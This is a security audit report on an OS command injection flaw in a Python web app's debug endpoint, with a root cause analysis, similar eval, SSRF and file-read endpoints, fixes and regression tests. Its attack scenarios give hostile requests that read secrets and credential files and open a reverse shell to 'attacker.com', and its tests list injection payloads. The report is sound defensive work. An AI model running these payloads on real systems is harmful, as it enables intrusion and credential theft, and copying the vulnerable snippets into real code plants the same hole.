# Security Analysis: Command Injection Vulnerability in debug_run Endpoint

**Date:** 2026-04-06
**File:** week6/backend/app/routers/notes.py
**Lines:** 108-117
**Rule ID:** python.lang.security.audit.subprocess-shell-true.subprocess-shell-true
**Severity:** CRITICAL

## Vulnerability Understanding

### Vulnerability Type
**Command Injection (OS Command Injection)** - A critical vulnerability that allows an attacker to execute arbitrary operating system commands on the server.

### Attack Vector
The vulnerability is located at `/notes/debug/run?cmd=<command>` and exploits the following pattern:
1. User-controlled input (`cmd` parameter) is directly passed to `subprocess.run()`
2. The `shell=True` parameter enables shell metacharacter interpretation
3. No input validation, sanitization, or command whitelisting is performed

### Potential Impact
**Critical Severity** - This vulnerability provides complete server compromise:

**System-Level Attacks:**
- Execute arbitrary shell commands with application privileges
- Read/write arbitrary files on the server
- Modify system configurations
- Install malware or backdoors
- Establish reverse shells for persistent access
- Pivot to attack other systems on the network

**Data Breaches:**
- Steal application source code
- Access database credentials
- Read environment variables (API keys, secrets)
- Export sensitive user data
- Access logs and session data

**Service Disruption:**
- Delete critical system files
- Terminate services
- Consume system resources (DoS)
- Corrupt databases

### Exploitability in Current Context
**HIGHLY EXPLOITABLE** - The vulnerability is production-ready:
- No authentication required (endpoint is publicly accessible)
- No rate limiting or request throttling
- Returns command output directly to attacker
- No request validation or input sanitization
- CORS is configured with wildcard origins, facilitating exploitation from any website

**Example Attack Scenarios:**
```bash
# Read environment variables (secrets, API keys)
GET /notes/debug/run?cmd=env

# Read application source code
GET /notes/debug/run?cmd=cat%20/app/backend/app/main.py

# Access database credentials
GET /notes/debug/run?cmd=cat%20/.env

# List files in data directory
GET /notes/debug/run?cmd=ls%20-la%20/data

# Establish reverse shell
GET /notes/debug/run?cmd=bash%20-i%20>%26%20/dev/tcp/attacker.com/4444%200>%261

# Chain commands for complex attacks
GET /notes/debug/run?cmd=cat%20/etc/passwd%20%26%26%20whoami
```

## Root Cause Analysis

### Why This Vulnerability Exists

**1. Direct User Input to System Call**
The endpoint takes raw user input and passes it directly to `subprocess.run()` without any validation:
```python
def debug_run(cmd: str) -> dict[str, str]:
    completed = subprocess.run(cmd, shell=True, ...)
```

**2. Shell Interpretation Enabled**
The `shell=True` parameter invokes the system shell (bash/sh), which interprets shell metacharacters:
- Command chaining: `;`, `&&`, `||`, `|`
- Command substitution: `$()`, backticks
- Redirection: `>`, `<`, `>>`
- Pipes: `|`
- Variable expansion: `$VAR`

**3. No Input Validation**
The code performs zero validation on the `cmd` parameter:
- No length restrictions
- No character filtering
- No command whitelisting
- No syntax validation

**4. Debug Endpoint in Production Code**
This is clearly marked as a debug endpoint (`debug_run`) but is included in production code. Debug endpoints are development tools that should never be deployed.

### Design Pattern That Led to Vulnerability

**Anti-Pattern: "Convenience over Security"**
The developer prioritized ease of use (easy to execute any command) over security. This is a common mistake when creating admin/debug interfaces.

**Missing Security Layers:**
- No authentication/authorization
- No input validation
- No command sandboxing
- No logging/auditing
- No rate limiting

### Similar Issues in Codebase

The codebase contains multiple similar vulnerabilities, indicating a systemic security issue:

**1. debug_eval - Code Injection (Line 102-105)**
```python
@router.get("/debug/eval")
def debug_eval(expr: str) -> dict[str, str]:
    result = str(eval(expr))  # noqa: S307
    return {"result": result}
```
- Same pattern: direct user input to dangerous function
- Uses `eval()` which executes arbitrary Python code
- Also marked as debug endpoint

**2. debug_read - Path Traversal (Line 129-135)**
```python
@router.get("/debug/read")
def debug_read(path: str) -> dict[str, str]:
    try:
        content = open(path).read(1024)
    except Exception as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    return {"snippet": content}
```
- Allows reading arbitrary files
- No path validation or directory restriction
- Could access sensitive system files

**3. debug_fetch - SSRF (Line 120-126)**
```python
@router.get("/debug/fetch")
def debug_fetch(url: str) -> dict[str, str]:
    from urllib.request import urlopen
    with urlopen(url) as res:  # noqa: S310
        body = res.read(1024).decode(errors="ignore")
    return {"snippet": body}
```
- Allows arbitrary URL fetching
- Can be used for SSRF attacks
- Can access internal network resources

**Common Pattern:** All debug endpoints follow the same anti-pattern: `user_input → dangerous_function → return_output`

## Mitigation Strategy

### Recommended Fix Approach

**IMMEDIATE ACTION: REMOVE THE ENTIRE ENDPOINT**

This endpoint has no legitimate production use case. Debug endpoints should:
1. Never be deployed to production
2. Be removed before deployment
3. If absolutely needed, be protected by strong authentication and authorization

**Complete Removal:**
```python
# DELETE this entire function from notes.py:
# @router.get("/debug/run")
# def debug_run(cmd: str) -> dict[str, str]:
#     import subprocess
#     completed = subprocess.run(cmd, shell=True, capture_output=True, text=True)
#     return {
#         "returncode": str(completed.returncode),
#         "stdout": completed.stdout,
#         "stderr": completed.stderr,
#     }
```

### OWASP Guidelines

**OWASP Top 10 - A03:2021 - Injection**
- **CWE-78: OS Command Injection** - This exact vulnerability
- **OWASP ASVS v4.0 V5.3.1:** "Verify that application does not use OS commands to interact with the operating system"
- **OWASP ASVS v4.0 V5.3.2:** "Verify that application uses secure APIs for OS interactions if required"

**OWASP Best Practices:**
1. **Avoid OS command execution** whenever possible
2. Use language-native libraries instead of shell commands
3. If command execution is required:
   - Use `shell=False` with argument lists
   - Validate and sanitize all inputs
   - Use allow-lists (whitelisting) not block-lists
   - Escape special characters
   - Run with least privilege
   - Implement rate limiting

### Security Best Practices

**1. Defense in Depth**
```python
# If command execution is absolutely necessary (NOT RECOMMENDED):
import shlex
from typing import List

# Whitelist approach - ONLY allow specific commands
ALLOWED_COMMANDS = {
    "ls": ["/bin/ls"],
    "pwd": ["/bin/pwd"],
    "date": ["/bin/date"],
}

def safe_execute(command: str) -> dict[str, str]:
    """Safely execute whitelisted commands"""
    # Validate command against whitelist
    command_parts = shlex.split(command)
    if not command_parts:
        raise ValueError("Empty command")

    base_cmd = command_parts[0]
    if base_cmd not in ALLOWED_COMMANDS:
        raise ValueError(f"Command not allowed: {base_cmd}")

    # Use shell=False and provide command as list
    allowed_path = ALLOWED_COMMANDS[base_cmd]
    result = subprocess.run(
        [allowed_path[0]] + command_parts[1:],
        shell=False,  # CRITICAL: Never use shell=True
        capture_output=True,
        text=True,
        timeout=5  # Prevent long-running commands
    )

    return {
        "returncode": str(result.returncode),
        "stdout": result.stdout,
        "stderr": result.stderr,
    }
```

**2. Alternative Approaches**

**Use Python Libraries Instead of Shell Commands:**
```python
# BAD: subprocess.run("ls -la /data", shell=True)
# GOOD:
import os
import pathlib

data_path = pathlib.Path("/data")
entries = [(f.name, f.stat().st_size) for f in data_path.iterdir()]

# BAD: subprocess.run("cat file.txt", shell=True)
# GOOD:
with open("file.txt", "r") as f:
    content = f.read()

# BAD: subprocess.run("grep pattern file.txt", shell=True)
# GOOD:
import re
with open("file.txt", "r") as f:
    matches = [line for line in f if re.search(pattern, line)]
```

## Testing Requirements

### Tests to Verify Fix

**1. Endpoint Removal Test**
```python
def test_debug_run_endpoint_removed(client):
    """Verify debug_run endpoint no longer exists"""
    # Try to access the removed endpoint
    r = client.get("/notes/debug/run?cmd=ls")
    assert r.status_code == 404, "debug_run endpoint should be removed"
```

**2. All Debug Endpoints Removed Test**
```python
def test_all_debug_endpoints_removed(client):
    """Verify all debug endpoints are removed"""
    debug_endpoints = [
        "/notes/debug/run",
        "/notes/debug/eval",
        "/notes/debug/fetch",
        "/notes/debug/read",
        "/notes/debug/hash-md5",
    ]

    for endpoint in debug_endpoints:
        r = client.get(endpoint)
        assert r.status_code == 404, f"{endpoint} should be removed"
```

**3. No Command Execution Via Other Endpoints Test**
```python
def test_no_command_execution_injection(client):
    """Ensure no other endpoints can execute commands"""
    # Try command injection patterns on all endpoints
    injection_attempts = [
        "; ls",
        "&& ls",
        "| ls",
        "$(ls)",
        "`ls`",
        "whoami"
    ]

    for injection in injection_attempts:
        # Test on various endpoints
        r = client.get(f"/notes/?q={injection}")
        assert r.status_code == 200
        data = r.json()
        # Verify output doesn't contain command results
        for item in data:
            assert "root" not in str(item), "Command injection detected"
            assert "bin" not in str(item), "Command injection detected"
```

### Edge Cases to Consider

**1. URL Encoding Variants**
```python
def test_url_encoded_command_injection(client):
    """Test various URL encoding schemes"""
    injections = [
        "%3B%20ls",      # ; ls
        "%26%26%20ls",   # && ls
        "%7C%20ls",      # | ls
        "%24%28ls%29",   # $(ls)
        "%60ls%60",      # `ls`
    ]

    for injection in injections:
        r = client.get(f"/notes/debug/run?cmd={injection}")
        assert r.status_code == 404, "URL-encoded command injection should fail"
```

**2. Command Chaining Variants**
```python
def test_command_chaining_patterns(client):
    """Test various command chaining patterns"""
    chaining_patterns = [
        "ls; whoami",
        "ls && whoami",
        "ls || whoami",
        "ls | whoami",
        "ls\nwhoami",
        "ls\r\nwhoami",
        "ls\twhoami",
    ]

    for pattern in chaining_patterns:
        r = client.get(f"/notes/debug/run?cmd={pattern}")
        assert r.status_code == 404, f"Command chaining with {pattern} should fail"
```

**3. Command Substitution Patterns**
```python
def test_command_substitution(client):
    """Test command substitution patterns"""
    substitutions = [
        "$(whoami)",
        "`whoami`",
        "${IFS}whoami",  # Space replacement
        "$(echo whoami)",  # Nested commands
    ]

    for sub in substitutions:
        r = client.get(f"/notes/debug/run?cmd=echo {sub}")
        assert r.status_code == 404, f"Command substitution with {sub} should fail"
```

## Summary

**CRITICAL FINDING:** The `debug_run` endpoint represents a **severe command injection vulnerability** that provides complete server compromise.

**Key Points:**
- **Severity:** CRITICAL (CWE-78)
- **Exploitability:** HIGH (no auth, no validation, publicly accessible)
- **Impact:** COMPLETE (system compromise, data breach, lateral movement)
- **Root Cause:** Direct user input to `subprocess.run()` with `shell=True`
- **Systemic Issue:** Multiple similar vulnerabilities in debug endpoints

**Recommended Actions:**
1. **IMMEDIATE:** Remove all debug endpoints (`/debug/*`, `/unsafe-search`)
2. **VERIFY:** Run security scan to confirm removal
3. **TEST:** Add tests to ensure endpoints don't return
4. **REVIEW:** Audit codebase for similar patterns
5. **POLICY:** Implement code review gate for debug endpoints

**Alternative (if absolutely required):**
- Implement strict command whitelisting
- Use `shell=False` with argument lists
- Add authentication, authorization, and rate limiting
- Implement comprehensive input validation
- Add extensive logging and monitoring

**Testing Priority:**
1. Verify endpoint removal (404 response)
2. Test all debug endpoints removed
3. Verify no command execution via other endpoints
4. Test various injection patterns
5. Confirm security scan passes

## Sources

- [OS Command Injection - OWASP](https://owasp.org/www-community/attacks/OS_Command_Injection)
- [Command Injection - CWE-78](https://cwe.mitre.org/data/definitions/78.html)
- [Python subprocess Security](https://docs.python.org/3/library/subprocess.html#security-considerations)
